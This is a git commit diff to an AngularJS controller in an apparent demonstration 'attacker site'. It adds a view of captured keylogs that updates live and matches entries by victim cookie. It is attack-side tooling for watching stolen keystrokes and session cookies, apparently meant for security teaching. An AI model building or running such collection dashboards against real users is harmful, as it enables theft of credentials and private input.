619a7b446407178cc621880ec4617ad2f3801620
William Ferguson <wferguson@scottlogic.com>
2015-12-23 15:07:49 +0000

    Added keylog sending to attacker server

--- Samples/Attacker_site/ng/logs.ctrl.js
+++ Samples/Attacker_site/ng/logs.ctrl.js
@@ -1,5 +1,5 @@
 ﻿angular.module('app')
-.controller('LogsCtrl', function ($scope, LogsSvc) {
+.controller('LogsCtrl', function ($scope, LogsSvc, KeylogsSvc) {
     LogsSvc.fetch()
     .success(function (logs) {
         $scope.logs = logs;
@@ -11,5 +11,23 @@
         });
     });
     
+    KeylogsSvc.fetch()
+    .success(function (logs) {
+        $scope.keylogs = logs;
+    });
+
+    $scope.$on('ws:new_keylog', function (_, log) {
+        $scope.$apply(function () {
+            $scope.keylogs.unshift(log);
+        });
+    });
+    $scope.$on('ws:updated_keylog', function (_, log) {
+        var indexOf = $scope.keylogs.map(function(otherLog) {
+            return otherLog.cookie === log.cookie;
+        }).indexOf(true);
+        $scope.$apply(function () {
+            $scope.keylogs[indexOf] = log;
+        });
+    });
 });
 
